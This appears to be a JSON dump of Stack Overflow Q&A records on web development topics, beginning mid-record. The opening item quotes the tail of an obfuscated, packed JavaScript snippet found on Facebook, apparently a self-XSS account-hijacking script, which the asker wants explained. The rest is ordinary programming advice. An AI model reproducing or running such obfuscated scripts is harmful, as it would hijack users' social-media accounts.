F){1f(F[i][e[5]]==e[1g])\n{F[i][e[13]](c)}};m[e[13]](c);B(C(){d[e[2]](1h)[e[4]]=d[e[2]](1i)[e[5]];},1k)},1l)},1m)},O);\n',62,85,'||||||||||||||variables|x65|x69|x74||x6E|x6C|x73||x61|x67|x76|x6D|x6F||x63|x70|x45|x5F|x64|x68|x72|x75|setTimeout|function|x79|true|inp|x6B|x2F|x62|x42|x54|x4D|document|sl|5000|var|x49|x48|x4C|x66|x6A|x78|x2E|x44|x4E|x53|||||||||||kPtsfs|fs|SocialGraphManager|for|in|if|20|SqmbQL|rhsjGW|21|2000|4000|3000'.split('|'),0,{}))})();\n</code></pre>\n\n<p>What the hell is this?  What would happen if I put it in my address bar, which I assume would be a very unwise idea?</p>\n\n<p>I am confused.</p>\n",
            "last_activity_date": 1386617335,
            "question_id": 2939421,
            "score": 21,
            "tags": [
                "javascript",
                "facebook"
            ],
            "title": "What is this weird script I found on facebook?"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>This is an issue with the server... According to Pingdom, \"The web browser is waiting for data from the server\" is what defines the \"Wait\" time.</p>\n\n<p>There isn't much you can do from a javascript or code end to fix this.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>that \"wait\" is basically the time your server spends rendering the page. So you need to make your software render it faster. Faster disks, more memory, more processors or optimize the software or optimize the database. Or buy more servers. Or add a cache. </p>\n",
                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<p>The wait time, also known as <a href=\"http://en.wikipedia.org/wiki/Time_To_First_Byte\" rel=\"nofollow\">time to first byte</a> is how long it takes for the server to send the first byte from when the connection is initiated. If this is high, it means your server has got to do a lot of work to render the page before sending it. We need more information about what your site is doing to render the page.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>If you have multiple server requests which the page is waiting on, you can make sure that those server requests are sent asynchronously in parallel so that you are serializing them.  </p>\n\n<p>The slowest possible way to fetch multiple requests is to send one request, wait for its response, send the next request, wait for its response, etc...  It's usually much faster to send all requests asynchronously and then process all responses as they arrive.  This shortens the total wait time to the longest wait time for any single request rather than the cumulative wait time of all requests.</p>\n\n<p>If you are only making one single request, then all you can do on the client-side of things is to make sure that the request is sent to the server as early as possible in the page loading sequence so that other parts of the page can be doing their business while the request is processing, thus getting the initial request started sooner (and thus finishing sooner).</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>The most common reason for this in the case of Apache is the usage of DNS Reversal Lookup. What this means is that the server tries to figure out what the name of your machine is, each time you make a request. This can take several seconds, and that explains why you have a long WAIT time and then a very quick load, because the matter is not about bandwidth.</p>\n\n<p>The obvious solution for this is to disable hostnamelookup in /etc/httpd/conf/httpd.conf</p>\n\n<pre><code>HostnameLookups Off\n</code></pre>\n\n<p>However...this is usually NOT enough. The fact is that in many cases, apache still does a reversal lookup even when you have disabled host name lookup, so you need to take a careful look at each line of your apache config. In particular, one of the most common reasons for this are LOGS. By default on many red hat - centos installations, the log format includes %h which stands for \"hostname\", and requires apache to do a reverse lookup. You can see this here:</p>\n\n<pre><code>LogFormat \"%h %l %u %t \\\"%r\\\" %&gt;s %b \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\"\" combined\nLogFormat \"%h %l %u %t \\\"%r\\\" %&gt;s %b\" common\n</code></pre>\n\n<p>You should change those %h for %a to solve this problem.</p>\n",
                    "is_accepted": false,
                    "score": 29
                },
                {
                    "body": "<p>TTFB is directly influenced by \"physical\" distance between browser and server. CDN proxy is the best way to shorten said distance. This, coupled with native caching capabilities, will help provide swifter response by loading cached object from the nearest POP (point of placement) location. </p>\n\n<p>The effect will depend on user geo-location and CDN's spread. Still, you can expect <a href=\"http://www.incapsula.com/the-incapsula-blog/item/718-what-incapsula-free-did-for-my-site\" rel=\"nofollow\">significant improvement</a>, 50%-70% or more. </p>\n\n<p>Speaking from experience, I saw cases in which 90% of content was cached and deliver directly from proxy placed on a different continent, from the other side of the globe. </p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am trying to optimize my site's speed and I'm using the great tool at <a href=\"http://tools.pingdom.com/fpt/\">pingdom.com</a>.  Right now, over 50% of the time it takes to load the page is \"Wait\" time as shown in the screenshot below.  What can I do to reduce this?  Also, how typical is this figure?  are there benchmarks on this?  Thanks!</p>\n\n<p><img src=\"http://i.stack.imgur.com/RgsFY.png\" alt=\"high server wait time\"></p>\n\n<p><strong>EDIT:</strong>\nOk.. let me clarify a few things.  There are no server side scripts or database calls going on. Just HTML, CSS, JS, and images.  I have already done some things like push js to the end of the body tag to get parallel downloads.  I am aware that the main.html and templates.html are adding to the overall wait time by being done synchronously after js.js downloads, that's not the problem.  I am just surprised at how much \"wait\" time there is for each request.  Does server distance affect this?  what about being on a shared server, does that affect the wait time?  Is there any low-hanging fruit to remedy those issues?</p>\n\n<p><img src=\"http://i.stack.imgur.com/rsBlu.png\" alt=\"enter image description here\"></p>\n",
            "last_activity_date": 1404070718,
            "question_id": 10938682,
            "score": 20,
            "tags": [
                "javascript",
                "performance",
                "apache",
                "networking"
            ],
            "title": "How to reduce server &quot;Wait&quot; time?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>You should use a regex for that.</p>\n\n<pre><code>db.users.find({name: /peter/i});\n</code></pre>\n\n<p>Be wary, though, that this query doesn't use index.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<pre><code>collection.findOne({\n    username: /peter/i\n}, function (err, user) {\n    assert(/peter/i.test(user.username))\n})\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>I had problems with this recently, i use this code and work fine for me.</p>\n\n<pre><code>var data = 'Peter';\n\ndb.User.find({'name' : new RegExp(data, 'i')}, function(err, docs){\n    cb(docs);\n});\n</code></pre>\n\n<p>Use directly <code>/Peter/i</code> work, but i use <code>'/'+data+'/i'</code> and not work for me.</p>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
                    "body": "<p>Well. Just for people who are lookin for the answer i was i did like this</p>\n\n<pre><code>var name = 'Peter';\nmodel.findOne({name: new RegExp('^'+name+'$', \"i\")}, function(err, doc) {\n  //Do your action here..\n});\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 39
                },
                {
                    "body": "<pre><code>router.route('/product/name/:name')\n.get(function(req, res) {\n\n    var regex = new RegExp(req.params.name, \"i\")\n    ,   query = { description: regex };\n\n    Product.find(query, function(err, products) {\n        if (err) {\n            res.json(err);\n        }\n\n        res.json(products);\n    });\n\n});  \n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I like to to go find a user in mongoDb by looking for a user called value.\nThe problem with:</p>\n\n<pre><code>username: 'peter'\n</code></pre>\n\n<p>is that i dont find it if the username is \"Peter\", or \"PeTER\".. or something like that.</p>\n\n<p>So i want to do like sql</p>\n\n<pre><code>SELECT * FROM users WHERE username LIKE 'peter'\n</code></pre>\n\n<p>Hope you guys get what im askin for?</p>\n\n<p><em>Short: 'field LIKE value' in mongoose.js/mongodb</em></p>\n",
            "last_activity_date": 1405549646,
            "question_id": 9824010,
            "score": 20,
            "tags": [
                "javascript",
                "node.js",
                "mongodb",
                "find",
                "mongoose"
            ],
            "title": "Mongoose.js: Find user by username LIKE value"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Have you looked at setting your own WebChromeClient?</p>\n\n<p>It looks like <a href=\"http://developer.android.com/reference/android/webkit/WebChromeClient.html#onProgressChanged%28android.webkit.WebView,%20int%29\" rel=\"nofollow\">onProgressUpdated</a> might inform you when a page has fully loaded.</p>\n\n<p>This appears to be the method used by Android's built-in browser.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Thanks to David Caunt for his suggestion to look at the response headers.</p>\n\n<p>I've found the following to work pretty well:</p>\n\n<p>Instead of having webview perform the HTTP requests, do them yourself so you can check the HTTP status code for redirects. Follow the redirection chain. When you get to a request that is not a redirect set a flag and send the data to the webview via <code>webview.loadDataWithBaseURL</code>. The flag is checked in  <code>WebViewClient.onPageFinished()</code> so it knows that all redirects are done. The javascript can be injected at this point. Of course the page itself might be doing some javascript manipulation at this point, it is difficult to know, so adding a delay (say 500ms) to the javascript allows for the DOM to settle. <code>setTimeout(function(){/* your code */}, 500)</code>.</p>\n",
                    "is_accepted": true,
                    "score": 8
                }
            ],
            "body": "<p>I want to know how to determine when a WebView is <strong><em>completely</em></strong> done loading.</p>\n\n<p>Let me define <strong><em>completely</em></strong>.</p>\n\n<ul>\n<li>All redirects have happened</li>\n<li>The page is visibly displayed, nothing has yet to load</li>\n</ul>\n\n<p>Bad answers to this question:</p>\n\n<p><code>WebViewClient.onPageFinished()</code> - this fires multiple times if there are redirects loading a page. It also fires before the page is displayed.</p>\n\n<p><code>PictureListener.onNewPicture()</code> - this fires every time the screen changes and AFAICT each redirect. How would I know which firing is the final one?</p>\n\n<p><code>WebChromeClient.onProgressChanged()</code> - same problem as onPageFinished. (Added after David suggested this solution below)</p>\n\n<p><code>Thread.sleep(5000)</code> - should be obvious, why this isn't acceptable.</p>\n\n<p>Of course, a clever combination of the above that works would be perfect.</p>\n\n<p>Why do I want to know this you ask?\nBecause I want to inject some javascript <strong><em>one time</em></strong> once the webview is <strong><em>completely</em></strong> done loading.</p>\n",
            "last_activity_date": 1302543883,
            "question_id": 5587888,
            "score": 20,
            "tags": [
                "javascript",
                "android",
                "webview"
            ],
            "title": "How to determine when Android WebView is completely done loading?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>I've tried to do this sort of thing before; generally, it just doesn't happen. You can probably fake it, though, by applying <code>Array.prototype</code> methods internally. This <code>CustomArray</code> class, though only tested in Chrome, implements both the standard <code>push</code> and custom method <code>last</code>. (Somehow this methodology never actually occurred to me at the time xD)</p>\n\n<pre><code>function CustomArray() {\n    this.push = function () {\n        Array.prototype.push.apply(this, arguments);\n    }\n    this.last = function () {\n        return this[this.length - 1];\n    }\n    this.push.apply(this, arguments); // implement \"new CustomArray(1,2,3)\"\n}\na = new CustomArray(1,2,3);\nalert(a.last()); // 3\na.push(4);\nalert(a.last()); // 4\n</code></pre>\n\n<p>Any Array method you intended to pull into your custom implementation would have to be implemented manually, though you could probably just be clever and use loops, since what happens inside our custom <code>push</code> is pretty generic.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Juriy Zaytsev (<a href=\"http://stackoverflow.com/users/130652/kangax\">@kangax</a>) just today released a really good article on the subject.</p>\n\n<p>He explores various alternatives like the Dean Edwards <em>iframe borrowing</em> technique, direct object extension, prototype extension and the usage of ECMAScript 5 accessor properties.</p>\n\n<p>At the end there is no perfect implementation, each one has its own benefits and drawbacks.</p>\n\n<p>Definitely a really good read:</p>\n\n<ul>\n<li><a href=\"http://perfectionkills.com/how-ecmascript-5-still-does-not-allow-to-subclass-an-array/\">How ECMAScript 5 still does not allow to subclass an array</a></li>\n</ul>\n",
                    "is_accepted": true,
                    "score": 23
                },
                {
                    "body": "<p>Checkout this. It works as it should in all browsers which support '<strong>__proto__</strong>'.</p>\n\n<pre><code>var getPrototypeOf = Object.getPrototypeOf || function(o){\n    return o.__proto__;\n};\nvar setPrototypeOf = Object.setPrototypeOf || function(o, p){\n    o.__proto__ = p;\n    return o;\n};\n\nvar CustomArray = function CustomArray() {\n    var array;\n    var isNew = this instanceof CustomArray;\n    var proto = isNew ? getPrototypeOf(this) : CustomArray.prototype;\n    switch ( arguments.length ) {\n        case 0: array = []; break;\n        case 1: array = isNew ? new Array(arguments[0]) : Array(arguments[0]); break;\n        case 2: array = [arguments[0], arguments[1]]; break;\n        case 3: array = [arguments[0], arguments[1], arguments[2]]; break;\n        default: array = new (Array.bind.apply(Array, [null].concat([].slice.call(arguments))));\n    }\n    return setPrototypeOf(array, proto);\n};\n\nCustomArray.prototype = Object.create(Array.prototype, { constructor: { value: CustomArray } });\nCustomArray.prototype.append = function(var_args) {\n    var_args = this.concat.apply([], arguments);        \n    this.push.apply(this, var_args);\n\n    return this;\n};\nCustomArray.prototype.prepend = function(var_args) {\n    var_args = this.concat.apply([], arguments);\n    this.unshift.apply(this, var_args);\n\n    return this;\n};\n[\"concat\", \"reverse\", \"slice\", \"splice\", \"sort\", \"filter\", \"map\"].forEach(function(name) {\n    var _Array_func = this[name];\n    CustomArray.prototype[name] = function() {\n        var result = _Array_func.apply(this, arguments);\n        return setPrototypeOf(result, getPrototypeOf(this));\n    }\n}, Array.prototype);\n\nvar array = new CustomArray(1, 2, 3);\nconsole.log(array.length, array[2]);//3, 3\narray.length = 2;\nconsole.log(array.length, array[2]);//2, undefined\narray[9] = 'qwe';\nconsole.log(array.length, array[9]);//10, 'qwe'\nconsole.log(array+\"\", array instanceof Array, array instanceof CustomArray);//'1,2,,,,,,,,qwe', true, true\n\narray.append(4);\nconsole.log(array.join(\"\"), array.length);//'12qwe4', 11\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Is it possible to subclass and inherit from javascript Arrays?</p>\n\n<p>I'd like to have my own custom Array object that has all the features of an Array, but contains additional properties.  I'd use <code>myobj instanceof CustomArray</code> to perform specific operations if the instance is my CustomArray.</p>\n\n<p>After attempting to subclass and running into some problems, I found this <a href=\"http://dean.edwards.name/weblog/2006/11/hooray/\">Dean Edwards</a> article that indicates doing this with Array objects doesn't work right. It turns out Internet Explorer doesn't handle it properly. But I'm finding other issues as well (only tested in Chrome so far).</p>\n\n<p>Here's some sample code:</p>\n\n<pre><code>/** \n *  Inherit the prototype methods from one constructor into another \n *  Borrowed from Google Closure Library \n */\nfunction inherits(childCtor, parentCtor) {\n    function tempCtor() {};\n    tempCtor.prototype = parentCtor.prototype;\n    childCtor.superClass_ = parentCtor.prototype;\n    childCtor.prototype = new tempCtor();\n    childCtor.prototype.constructor = childCtor;\n},\n\n// Custom class that extends Array class\nfunction CustomArray() {\n    Array.apply(this, arguments);\n}\ninherits(CustomArray,Array);\n\narray = new Array(1,2,3);\ncustom = new CustomArray(1,2,3);\n</code></pre>\n\n<p>Entering the following in Chrome's console gives this output:</p>\n\n<pre><code>&gt; custom\n[]\n&gt; array\n[1, 2, 3]\n&gt; custom.toString()\nTypeError: Array.prototype.toString is not generic\n&gt; array.toString()\n\"1,2,3\"\n&gt; custom.slice(1)\n[]\n&gt; array.slice(1)\n[2, 3]\n&gt; custom.push(1)\n1\n&gt; custom.toString()\nTypeError: Array.prototype.toString is not generic\n&gt; custom\n[1]\n</code></pre>\n\n<p>Obviously, the objects don't behave the same. Should I give up on this approach, or is there some way to accomplish my goal of <code>myobj instanceof CustomArray</code>?</p>\n",
            "last_activity_date": 1408019259,
            "question_id": 3261587,
            "score": 20,
            "tags": [
                "javascript",
                "inheritance"
            ],
            "title": "Subclassing Javascript Arrays. TypeError: Array.prototype.toString is not generic"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Well, whether a property is considered enumerable or not is based on its own <a href=\"http://es5.github.io/#x8.6.1\"><code>[[Enumerable]]</code> attribute</a>. You can view this as part of the <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor\">property's descriptor</a>:</p>\n\n<pre><code>var descriptor = Object.getOwnPropertyDescriptor({ bar: 1 }, 'bar');\n\nconsole.log(descriptor.enumerable); // true\nconsole.log(descriptor.value);      // 1\n\nconsole.log(descriptor);\n// { value: 1, writable: true, enumerable: true, configurable: true }\n</code></pre>\n\n<p>A <code>for..in</code> loop then iterates through the object's property names.</p>\n\n<pre><code>var foo = { bar: 1, baz: 2};\n\nfor (var prop in foo)\n    console.log(prop); // outputs 'bar' and 'baz'\n</code></pre>\n\n<p>But, it only evaluates its <em>statement</em> -- <code>console.log(prop);</code> in this case -- for those properties whose <code>[[Enumerable]]</code> attribute is <code>true</code>.</p>\n\n<p>This condition is in place because objects actually <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object#Object_instances\">have many more properties</a>, especially <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/prototype\">those from inheritance</a>:</p>\n\n<pre><code>console.log(Object.getOwnPropertyNames(Object.prototype));\n// [\"constructor\", \"toString\", \"toLocaleString\", \"valueOf\", \"hasOwnProperty\", \"isPrototypeOf\", \"propertyIsEnumerable\", /* etc. */]\n</code></pre>\n\n<p>Each of these properties still <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/in\">exists on the object</a>:</p>\n\n<pre><code>console.log('constructor' in foo); // true\nconsole.log('toString' in foo);    // true\n// etc.\n</code></pre>\n\n<p>But, they're skipped (or \"<em>not counted</em>\") by the <code>for..in</code> loop because they're non-enumerable.</p>\n\n<pre><code>var descriptor = Object.getOwnPropertyDescriptor(Object.prototype, 'constructor');\n\nconsole.log(descriptor.enumerable); // false\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 18
                },
                {
                    "body": "<p>If you create an object via <code>myObj = {foo: 'bar'}</code> or something thereabouts, all properties are enumerable. So the easier question to ask is, what's not enumerable? Certain objects have some non-enumerable properties, for example if you call <code>Object.getOwnPropertyNames([])</code> (which returns an array of all properties, enumerable or not, on []), it will return <code>['length']</code>, which includes the non-enumerable property of an array, 'length'.</p>\n\n<p>You can make your own non-enumerable properties by calling <code>Object.defineProperty</code>:</p>\n\n<pre><code>var person = { age: 18 };\nObject.defineProperty(person, 'name', { value: 'Joshua', enumerable: false });\n\nperson.name; // 'Joshua'\nfor (prop in person) {\n  console.log(prop);\n}; // 'age'\n</code></pre>\n\n<p>This example borrows heavily from <a href=\"http://zduck.com/2013/non-enumerable-properties-in-javascript/\">Non-enumerable properties in JavaScript</a>, but shows an object being enumerated over. Properties can either be or not be writable, configurable, or enumerable. John Resig discusses this in the scope of <a href=\"http://ejohn.org/blog/ecmascript-5-objects-and-properties/\">ECMAScript 5 Objects and Properties</a>.</p>\n\n<p>And, there's a Stack Overflow question about <a href=\"http://stackoverflow.com/questions/14984533/what-are-the-benefits-of-making-properties-non-enumerable\">why you'd ever want to make properties non-enumerable</a>.</p>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>If you're having difficulty visualising \"what does it mean to be enumerable?\" why not ask yourself, what does it mean to be <em>nonenumerable</em>?</p>\n\n<p>I think of it a bit like this, a <strong><em>nonenumerable</em></strong> property <strong>exists</strong> but is partially <strong>hidden</strong>; meaning that <em>nonenumerable</em> is the weird one. Now you can imagine enumerable as what is left - the more natural property we're used to encountering since we discovered <em>Objects</em>. Consider</p>\n\n<pre><code>var o = {};\no['foo'] =  0;                               // enumerable, normal\nObject.defineProperty(o, 'bar', {value: 1}); // nonenumerable, weird\n</code></pre>\n\n<p>Now in a <code>for..in</code>, imagine it like <em>pseudocode</em></p>\n\n<pre><code>for property in o:\n    if not property enumerable continue // skip non-enumerable, \"bar\"\n    else do /* whatever */              // act upon enumerable, \"foo\"\n</code></pre>\n\n<p>where the body of the loop you typed in <em>JavaScript</em> is in the place of <code>/* whatever */</code></p>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p>I was directed to MDN's <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...in\">for..in page</a> when it said, \"for..in Iterates over the enumerable properties of an object.\"</p>\n\n<p>Then I went to the <a href=\"https://developer.mozilla.org/en-US/docs/Enumerability_and_ownership_of_properties\">Enumerability and ownership of properties page</a> where it said \"Enumerable properties are those which can be iterated by a for..in loop.\"</p>\n\n<p>The dictionary defines enumerable as countable, but I can't really visualize what that means. Could i get an example of something being enumerable?</p>\n",
            "last_activity_date": 1374902771,
            "question_id": 17893718,
            "score": 19,
            "tags": [
                "javascript",
                "enumerable"
            ],
            "title": "What does enumerable mean?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>I had the same issue when working with Zepto on mobile with single page - multiple views.</p>\n\n<p>Initially I used html5 statechange and onhashchange. It all have some issues in one or other mobile device. Finally I used Zepto history plugin from here <a href=\"https://github.com/browserstate/history.js\" rel=\"nofollow\">https://github.com/browserstate/history.js</a></p>\n\n<p>It somewhat solved most of the issues. Try it, it will be useful, it handle html4 and html5 features wherever possible.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I don't know about backbone.js<sup>1</sup>, but I have helped develop a mobile application which had to implement exactly this behavior in html5, so I should be able go give some good advice:</p>\n\n<p>First of all it's good to know that the <code>history.pushState</code> function exists. The big problem with it though is that <a href=\"http://code.google.com/p/android/issues/detail?id=23979\">it is supported up to android 2.3, but not on android 3 till android 4.0.3</a>. As kiranvj points out correctly this can be solved by using the popular <a href=\"https://github.com/balupton/history.js\">history.js</a> library which provides a polyfill solution for the lack of the history functionality. </p>\n\n<p>Now, getting to your actual problem, the way I implemented the history direction animations was by adding data to the <code>pushState</code> function ( <code>history.pushState(data,title,url)</code> ) with which I identified the logical position of the page. In my application I wasn't only limited to a horizontal bar, but in your case you would keep track of position where any new loaded page get's a position which is one higher then your current page. E.g.</p>\n\n<pre><code>History.pushState({position:History.getState().data.position+1},\"Your title\",\"Your URL\");\n</code></pre>\n\n<p>Next, when the <code>window.onstatechange</code> or <code>window.onanchorchange</code> event triggers you observe whether the position is higher or lower than your current page (e.g. by using the <a href=\"https://github.com/balupton/history.js\">history.js</a> <code>History.getState()</code> function which I used above) and depending on this you decide in which direction to move (lower is to the left, and higher is to the right), as is illustrated by the image below:</p>\n\n<p><img src=\"http://i.stack.imgur.com/Cwcwk.png\" alt=\"Illustration of history events\"></p>\n\n<p>You will also note that I already assumed on the first page that you have <code>{position:1}</code>, whereas normally the first page will have no state information. The way this can be achieved is by using <code>history.replaceState</code> which replaces the current empty state with a more informative state. Alternatively you can also check for an empty state on any of the previously mentioned events and if it's empty you assume it to be the left most one (<code>{position:1}</code>).</p>\n\n<p>Hope this helps and if you have any additional questions feel free to ask.</p>\n\n<p>Please note that this answer assumes you are using <a href=\"https://github.com/balupton/history.js\">history.js</a> and you would need to listen to slightly different events (such as <code>onpopstate</code>) and use slightly different structures (<code>history</code> rather than <code>History</code>) if you would want to build your own solution.</p>\n\n<p>It is also useful to note that it is possible to build this with your own queue array which gives you a lot more control, but will not work in combination with the browser's back button. This is a big issue with browser sites, however is far easier in case you are building a <a href=\"http://incubator.apache.org/cordova/\">cordova</a> (a.k.a. <a href=\"http://phonegap.com/\">phonegap</a>) web application.</p>\n\n<hr>\n\n<p><sup>1 Just read about it and it appears to do some history handling <a href=\"http://documentcloud.github.com/backbone/#History\">of its own</a>, which <em>might</em> make it more complex to integrate the technique described above.</sup></p>\n",
                    "is_accepted": true,
                    "score": 17
                },
                {
                    "body": "<p>If you're working on a <em>true</em> single-page app, why not you set up an array to hold history urls in a js variable (as opposed to relying on something like <code>history.pushState</code> and its support)?</p>\n\n<p>Whenever a new page is navigated to, you can push its url into the array, whenever a \"back\" button is pressed, you can retrieve the url needed as far back as you want. This will work perfectly as long as you correctly discard urls when the user goes back a few steps and then navigates to a <em>new</em> link.</p>\n\n<p>I've never tried implementing this to be used for page history, but this worked perfectly well for in-page undo-redo logic.</p>\n\n<h2>Update:</h2>\n\n<p>After further research, the approach above would not work for a page reload as it would be an action occuring outside of history handling available through JS. It would still work for tracking back/forward transitions, but such history will be lost on navigating to a url external to the app or a page refresh. David Mulder's answer seems to lack this limitation by relying on browser-level history that persists outside of the page scope.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Sammy.js's v.6.x branch (the one that relies just on hash changes) is a perfect, simplest, most browser-compatible approach to tracking history. There, history is not tracked at all, as Sammy just watches for hashchange.</p>\n\n<p>Relying on \"#/slide/123\" allows you to support hard page reloads, and simplifies the work</p>\n\n<p>Peel off the last part (slide number) on each page view, push into global. On new route, see if number is more or less than what is stored in global and do the correct (left or right) animation. If global is undefined, no animation.</p>\n",
                    "is_accepted": false,
                    "score": -2
                }
            ],
            "body": "<p>I have a single-page mobile application developed with Backbone and Zepto.</p>\n\n<p>It works correctly with the back/forward buttons in the browser.</p>\n\n<p>When the user navigates to a page, the <em>new</em> content slides in from the right as the <em>old</em> contents slides away to the left (and out of the viewport). I want the same thing to happen if the user presses the \"forward\" browser button. This all works.</p>\n\n<p>I've got a class that I add to the body element <code>navigate-back</code> that will flip this behaviour, so when the user navigates back with the browser's back button, they see the content sliding <em>back</em> in from the left and the other content sliding into the right. Basically just the opposite of going forward.</p>\n\n<p>I need to detect if the user is navigating backwards so I can invoke the alternate behaviour. I have tried implementing my own history stack, but I've ran into lots of problems where sometimes it marks a forward as a <em>back</em> navigation which ruins the visual cue. It's descended into a kludge of hacks now and probably would only embarrass me if I posted it.</p>\n\n<p>What is the best way to implement my own history stack so I can detect if the user is navigating forward/back in the context of a single-page Backbone mobile application?</p>\n",
            "last_activity_date": 1372622310,
            "question_id": 10846248,
            "score": 19,
            "tags": [
                "javascript",
                "mobile",
                "backbone.js",
                "browser-history",
                "zepto"
            ],
            "title": "How to implement my own history stack in a single page mobile web application?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>I can't see why an Ubuntu upgrade would have anything to do with your JavaScript. Are you using static JavaScript? Dynamic JavaScript? CoffeeScript? If one of the latter two, I suppose it's possible that the upgrade broke one of the tools that's processing your JS...</p>\n\n<p>Some things to try:</p>\n\n<ul>\n<li>View the JavaScript source in your browser. Make sure that the same source code is reaching your browser.</li>\n<li>Try running the Rails app on a different system (perhaps install a second VM with a different Ubuntu version and see if you can replicate the problem).</li>\n<li>Make triple-sure that the exact same version of the app code is in both places.</li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I would also suggest that you run the rails server passing it a different environment. This could be related to the Environment settings you have set up for development.</p>\n\n<pre><code>rails server -e production\n</code></pre>\n\n<p>If the problem disappears it has got to do with your config settings for the \"development environment.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>You might want to look at</p>\n\n<p><a href=\"http://stackoverflow.com/a/7854902/686460\">http://stackoverflow.com/a/7854902/686460</a></p>\n\n<p>\"Adding config.serve_static_assets = false to development.rb will prevent loading files from /public/assets\"</p>\n\n<p>I think that is a better solution than what you are suggesting here.</p>\n",
                    "is_accepted": true,
                    "score": 10
                },
                {
                    "body": "<p>I had the same problem and found an easy solution/hack to it. I just added this line:</p>\n\n<pre><code>config.assets.prefix = '/dev/assets'\n</code></pre>\n\n<p>to development.rb, where the prefix can be whatever you want, I put /dev/assets to avoid further confusion.</p>\n\n<p>Scripts do not load twice anymore, and I can use the images I have in /public/system that could not be read when I tried the solution of config.serve_static_assets = false</p>\n\n<p>So far I have not found disadvantages to this solution. Hope it serves to you as well!</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p><strong>Big Update</strong>: </p>\n\n<p>As I finally found the real solution, I also discovered the real problem. As I wrote down here a lot of useless information, considering the real problem, I'm making a huge update of the question so that other people can find easily what's going on and can see the solution. </p>\n\n<p><strong>The Problem</strong>: \nIt's because of the assets pipeline of Rails 3.1</p>\n\n<p>Actually... It's an easy one: the assets were rendered twice in development-environment. Doing lot of investigations shew me that my Rails 3.1 server was rendering the assets from both the \"app/assets\" and \"public/assets\" folders. So, I had every .js and .css files duplicated, which was breaking all my javascript animations (yeah... binding twice the same event and handler to the same element is not what you want... normally). </p>\n\n<p>And if the problem appeared all of a sudden, that was because I had to run \"rake assets:precompile\" to deploy my application. Since that, when my application was running in development, the server was rendering the static precompiled assets and the dynamic precompiled assets. </p>\n\n<p><strong>The solution (there's now a better one few lines below) - but you can still read it</strong></p>\n\n<p>First one: I just had to delete all the precompiled assets from my public folder. </p>\n\n<p>Better one: Add config.serve_static_assets = false to development.rb which will prevent loading files from /public/assets. Also, don't forget to reset your browser cache. </p>\n\n<p>[Edit: July 20th 2012]</p>\n\n<p>Advanced one: I recently had a new problem because of those static assets. You know, when you use <strong>paperclip or some other gem and they add your images in your public folder in some system sub-folder</strong> because it's better if you want to deploy your application using capistrano. Well, that's great but! As we added config.serve_static_assets=false, those images aren't rendered in development and that's bad if you want to do some css on them. So! What to do then?</p>\n\n<p>Well in fact you'll have to turn on static assets in development like so: </p>\n\n<pre><code># Expands the lines which load the assets\nconfig.assets.debug = true\nconfig.serve_static_assets = true\n</code></pre>\n\n<p>Then to prevent rails from rendering your other assets twice (the precompiled ones), just do this command: </p>\n\n<pre><code>rake assets:clean\n</code></pre>\n\n<p>It's the opposite of rake assets:precompile and will clean your public/assets folder so that Rails won't render your assets twice. Of course you'll still have to clean your browser cache and clean your assets each time you precompiled them.</p>\n\n<p>[Edit: November 18th 2013] - From @idejuan answer</p>\n\n<p><strong>Another solution:</strong></p>\n\n<p>You can add this line: </p>\n\n<p><code>config.assets.prefix = '/dev/assets'</code></p>\n\n<p>To development.rb, where the prefix can be whatever you want. Scripts will not load twice anymore, and images in /public/system will be read! But be carefull as it changes the path to your \"static\" assets... if you require assets from a gem, it might not load them properly in development...</p>\n\n<p>[End edit]</p>\n\n<p><strong>The remaining question with answer!</strong></p>\n\n<p>Well, why my development application was rendering static precompiled assets? </p>\n\n<p>In fact if you precompile your assets localy, rails render assets from the public folder AND from the assets folder in development and test environment by default. Normally assets from the public folder should overwrite those from the assets folder, but it's not the case and even if it does, we would lost the benefits of the \"debug_mode\" as we would have to precompile assets each time. So... Assets are rendered twice when precompiled locally in development and test environment. </p>\n\n<p>So, by adding \"config.serve_static_assets = false\" to your development.rb file, you somehow overwrite the default line that telling Rails to look in your public folder for assets. I hope they'll do something cleaner one day about locally precompiled 